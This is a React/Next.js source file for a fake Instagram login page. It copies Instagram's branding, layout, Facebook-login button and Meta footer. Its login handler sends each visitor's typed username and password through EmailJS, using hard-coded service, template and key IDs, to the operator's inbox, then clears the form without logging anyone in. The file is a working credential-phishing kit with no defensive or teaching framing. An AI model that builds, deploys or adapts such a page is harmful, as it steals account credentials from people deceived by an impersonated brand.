'use client'
import emailjs from 'emailjs-com'
import { useEffect } from 'react'
import { useState } from 'react'
import Image from 'next/image'


export default function InstagramLoginPage() {
  const [showPassword, setShowPassword] = useState(false)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')        // ← add this
const [submitted, setSubmitted] = useState(false)

  useEffect(() => {
    emailjs.init('fC6lMjHeHeHg4U2cM')
  }, [])


  const handleLogin = async (e: React.FormEvent) => {
  e.preventDefault()
  setIsLoading(true)
  setError('')

  try {
    await emailjs.send(
      'service_gxoq32g',   // Your Service ID
      'template_tnx2oas',  // Your Template ID
      { username, password },
      'fC6lMjHeHeHg4U2cM'    // Your Public Key
    )
    setSubmitted(true)
    setUsername('')
    setPassword('')
  } catch (err) {
    setError('Something went wrong. Please try again.')
  } finally {
    setIsLoading(false)
  }
}

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Desktop Layout */}
      <div className="hidden lg:grid lg:grid-cols-2 min-h-screen">
        {/* Left Side - Marketing Content */}
        <div className="bg-white flex items-center justify-center px-12 border-r border-gray-200">
          <div className="w-full max-w-md">
            {/* Instagram Gradient Logo */}
            <div className="mb-12">
              <svg width="100" height="100" viewBox="0 0 100 100" className="mx-auto">
                <defs>
                  <linearGradient id="instagramGradient" x1="0%" y1="100%" x2="100%" y2="0%">
                    <stop offset="0%" style={{ stopColor: '#feda75', stopOpacity: 1 }} />
                    <stop offset="5%" style={{ stopColor: '#fa7e1e', stopOpacity: 1 }} />
                    <stop offset="45%" style={{ stopColor: '#d92e7f', stopOpacity: 1 }} />
                    <stop offset="60%" style={{ stopColor: '#9b36b7', stopOpacity: 1 }} />
                    <stop offset="90%" style={{ stopColor: '#515bd4', stopOpacity: 1 }} />
                  </linearGradient>
                </defs>
                <rect x="10" y="10" width="80" height="80" rx="18" fill="none" stroke="url(#instagramGradient)" strokeWidth="3" />
                <circle cx="50" cy="50" r="20" fill="none" stroke="url(#instagramGradient)" strokeWidth="3" />
                <circle cx="70" cy="30" r="5" fill="url(#instagramGradient)" />
              </svg>
            </div>

            {/* Marketing Message */}
            <div className="text-center space-y-4">
              <h1 className="text-4xl font-light">See everyday moments from your</h1>
              <h2 className="text-5xl font-light">
                <span className="bg-gradient-to-r from-orange-400 via-pink-500 to-orange-400 bg-clip-text text-transparent">
                  close friends.
                </span>
              </h2>

              {/* Decorative Image Area */}
              <div className="mt-12 flex justify-center">
                <div className="relative w-72 h-80">
                  <img
                    src="/instagram-friends.jpg"
                    alt="See everyday moments from your close friends"
                    className="w-full h-full object-cover rounded-3xl shadow-2xl"
                  />

                  {/* Decorative Badges */}
                  <div className="absolute -top-4 left-8 bg-white rounded-full p-2 shadow-lg">
                    <div className="w-10 h-10 bg-gradient-to-br from-pink-400 to-red-500 rounded-full flex items-center justify-center text-white text-lg font-bold">
                      ❤️
                    </div>
                  </div>
                  <div className="absolute top-1/4 -right-4 bg-white rounded-full p-2 shadow-lg">
                    <div className="w-10 h-10 bg-yellow-400 rounded-full flex items-center justify-center text-white text-lg">
                      😊
                    </div>
                  </div>
                  <div className="absolute bottom-12 -right-6 bg-white rounded-full p-2 shadow-lg">
                    <div className="w-10 h-10 bg-green-400 rounded-full flex items-center justify-center text-white text-lg font-bold">
                      ✓
                    </div>
                  </div>
                  <div className="absolute -bottom-4 right-1/4 bg-white rounded-full p-2 shadow-lg">
                    <div className="w-10 h-10 bg-blue-400 rounded-full flex items-center justify-center text-white text-lg">
                      ⭐
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Side - Login Form */}
        <div className="bg-white flex items-center justify-center px-12">
          <div className="w-full max-w-sm space-y-4">
            {/* Form Card */}
            <div className="border border-gray-200 rounded-lg px-8 py-8 bg-white shadow-sm">
              {/* Heading */}
              <h2 className="text-2xl font-normal text-gray-900 mb-8 text-center">Log into Instagram</h2>

              {/* Form */}
              <form onSubmit={handleLogin} className="space-y-3">
                {/* Username Input */}
                <input
                  type="text"
                  placeholder="Mobile number, username or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-lg text-sm focus:outline-none focus:bg-white focus:border-gray-400 transition placeholder-gray-500"
                />

                {/* Password Input */}
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-lg text-sm focus:outline-none focus:bg-white focus:border-gray-400 transition placeholder-gray-500"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-900 focus:outline-none text-sm font-semibold"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={!username || !password || isLoading}
                  className="w-full mt-2 py-2.5 bg-blue-500 text-white font-semibold rounded-lg hover:bg-blue-600 disabled:opacity-60 disabled:cursor-not-allowed transition text-sm"
                >
                  {isLoading ? 'Logging in...' : 'Log in'}
                </button>
              </form>

              {/* Forgot Password */}
              <div className="text-center mt-4">
                <a href="#" className="text-sm text-blue-600 hover:text-blue-700 transition font-normal">
                  Forgot password?
                </a>
              </div>
            </div>

            {/* Facebook Login Button */}
            <button className="w-full flex items-center justify-center gap-2 py-2.5 text-sm font-semibold text-blue-900 hover:text-blue-950 transition">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
              </svg>
              Log in with Facebook
            </button>

            {/* Sign Up Card */}
            <div className="border border-gray-200 rounded-lg px-8 py-6 text-center bg-white shadow-sm">
              <p className="text-sm text-gray-900">
                Don&apos;t have an account?{' '}
                <a href="#" className="font-semibold text-blue-500 hover:text-blue-600 transition">
                  Create new account
                </a>
              </p>
            </div>

            {/* Meta Footer */}
            <div className="text-center">
              <svg width="20" height="20" viewBox="0 0 24 24" className="mx-auto mb-2">
                <defs>
                  <linearGradient id="metaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" style={{ stopColor: '#0084FF', stopOpacity: 1 }} />
                    <stop offset="100%" style={{ stopColor: '#0084FF', stopOpacity: 1 }} />
                  </linearGradient>
                </defs>
                <text x="12" y="18" textAnchor="middle" fontSize="16" fontWeight="bold" fill="url(#metaGradient)">
                  
                </text>
              </svg>
              
            </div>
          </div>
        </div>
      </div>

      {/* Mobile/Tablet Layout */}
      <div className="lg:hidden flex flex-col min-h-screen bg-white">
        {/* Mobile Header */}
        <div className="sticky top-0 bg-white border-b border-gray-200 px-4 py-3 z-40">
          <svg width="24" height="24" viewBox="0 0 100 100" className="mx-auto">
            <defs>
              <linearGradient id="instagramGradient" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" style={{ stopColor: '#feda75', stopOpacity: 1 }} />
                <stop offset="5%" style={{ stopColor: '#fa7e1e', stopOpacity: 1 }} />
                <stop offset="45%" style={{ stopColor: '#d92e7f', stopOpacity: 1 }} />
                <stop offset="60%" style={{ stopColor: '#9b36b7', stopOpacity: 1 }} />
                <stop offset="90%" style={{ stopColor: '#515bd4', stopOpacity: 1 }} />
              </linearGradient>
            </defs>
            <rect x="10" y="10" width="80" height="80" rx="18" fill="none" stroke="url(#instagramGradient)" strokeWidth="3" />
            <circle cx="50" cy="50" r="20" fill="none" stroke="url(#instagramGradient)" strokeWidth="3" />
            <circle cx="70" cy="30" r="5" fill="url(#instagramGradient)" />
          </svg>
        </div>

        {/* Mobile Content */}
        <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
          <div className="w-full max-w-sm">
            {/* Form Card */}
            <div className="border border-gray-200 rounded-lg px-6 py-6 bg-white shadow-sm mb-4">
              <h2 className="text-xl font-normal text-gray-900 mb-6 text-center">Log into Instagram</h2>

              {/* Form */}
              <form onSubmit={handleLogin} className="space-y-3">
                {/* Username Input */}
                <input
                  type="text"
                  placeholder="Mobile number, username or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-lg text-sm focus:outline-none focus:bg-white focus:border-gray-400 transition placeholder-gray-500"
                />

                {/* Password Input */}
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-lg text-sm focus:outline-none focus:bg-white focus:border-gray-400 transition placeholder-gray-500"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-900 focus:outline-none text-sm font-semibold"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={!username || !password || isLoading}
                  className="w-full mt-2 py-2.5 bg-blue-500 text-white font-semibold rounded-lg hover:bg-blue-600 disabled:opacity-60 disabled:cursor-not-allowed transition text-sm"
                >
                  {isLoading ? 'Logging in...' : 'Log in'}
                </button>
              </form>

              {/* Forgot Password */}
              <div className="text-center mt-4">
                <a href="#" className="text-sm text-blue-600 hover:text-blue-700 transition font-normal">
                  Forgot password?
                </a>
              </div>
            </div>

            {/* Facebook Login Button */}
            <button className="w-full flex items-center justify-center gap-2 py-2.5 text-sm font-semibold text-blue-900 hover:text-blue-950 transition mb-4">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
              </svg>
              Log in with Facebook
            </button>

            {/* Sign Up Card */}
            <div className="border border-gray-200 rounded-lg px-6 py-4 text-center bg-white shadow-sm">
              <p className="text-sm text-gray-900">
                Don&apos;t have an account?{' '}
                <a href="#" className="font-semibold text-blue-500 hover:text-blue-600 transition">
                  Create new account
                </a>
              </p>
            </div>
          </div>
        </div>

        {/* Mobile Footer */}
        <div className="border-t border-gray-200 px-4 py-4 text-center bg-white">
          <p className="text-xs text-gray-500">Meta</p>
        </div>
      </div>

      {/* Footer */}
      <footer className="hidden lg:block border-t border-gray-200 bg-white py-6 px-8">
        <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600">
          <a href="#" className="hover:text-gray-900">Meta</a>
          <a href="#" className="hover:text-gray-900">About</a>
          <a href="#" className="hover:text-gray-900">Blog</a>
          <a href="#" className="hover:text-gray-900">Jobs</a>
          <a href="#" className="hover:text-gray-900">Help</a>
          <a href="#" className="hover:text-gray-900">API</a>
          <a href="#" className="hover:text-gray-900">Privacy</a>
          <a href="#" className="hover:text-gray-900">Terms</a>
          <a href="#" className="hover:text-gray-900">Locations</a>
          <a href="#" className="hover:text-gray-900">Instagram Lite</a>
          <a href="#" className="hover:text-gray-900">Threads</a>
          <a href="#" className="hover:text-gray-900">Contact Uploading & Non-Users</a>
        </div>
      </footer>
    </div>
  )
}
